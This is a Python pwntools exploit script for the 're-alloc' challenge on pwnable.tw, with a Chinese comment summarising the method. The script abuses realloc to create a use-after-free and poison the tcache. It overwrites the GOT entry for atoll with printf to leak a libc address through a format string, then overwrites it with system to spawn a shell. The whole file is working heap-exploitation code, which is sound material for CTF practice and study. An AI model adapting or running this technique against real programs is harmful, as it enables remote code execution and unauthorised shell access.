#利用realloc实现uaf提前构造两条链，一个劫持got表人为构造格式化字符串漏洞泄露libc，另外一个修改为system，getshell
from pwn import *

context.log_level = 'debug'
prog = './re-alloc'
elf = ELF(prog)
#p = process(prog)

libc = ELF("libc.so")
p = remote('chall.pwnable.tw', 10106)
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()

def alloc(idx, size, content='a'*8):
	p.sendlineafter("choice: ", '1')
	p.sendlineafter("Index:", str(idx))
	p.sendlineafter("Size:", str(size))
	p.sendafter("Data:", content)
def realloc(idx, size, content='a'*8):
	p.sendlineafter("choice: ", '2')
	p.sendlineafter("Index:", str(idx))
	p.sendlineafter("Size:", str(size))
	if size != 0:
		p.sendafter("Data:", content)
def free(idx):
	p.sendlineafter("choice: ", '3')
	p.sendlineafter("Index:", str(idx))
def exp():
	alloc(0, 0x20)
	realloc(0, 0)
	realloc(0, 0x30, p64(elf.got["atoll"]))
	alloc(1, 0x20, 'a')
	free(0)
	realloc(1, 0x40, 'a')
	free(1)
	
	alloc(0, 0x8)
	realloc(0, 0)
	realloc(0, 0x50, p64(elf.got['atoll']))
	alloc(1, 0x8, 'a')
	free(0)
	realloc(1, 0x60, 'a')
	free(1)
	alloc(0, 0x20, p64(elf.plt['printf']))
	p.sendlineafter("choice: ", '1')
	p.sendlineafter("Index:", '%6$p')
	libc.address = int(p.recv(14)[2:], 16)-0x7f94ae0a7760+0x7f94adec2000
	log.info("libc.address ==> " + hex(libc.address))
	p.sendlineafter("choice: ", '1')
	p.sendlineafter("Index:", '')
	p.sendlineafter("Size:", 'a'*8)
	p.sendafter("Data:", p64(libc.sym['system']))

	p.sendlineafter("choice: ", '1')
	p.sendlineafter("Index:", 'sh')
	p.interactive()
if __name__ == '__main__':
	exp()
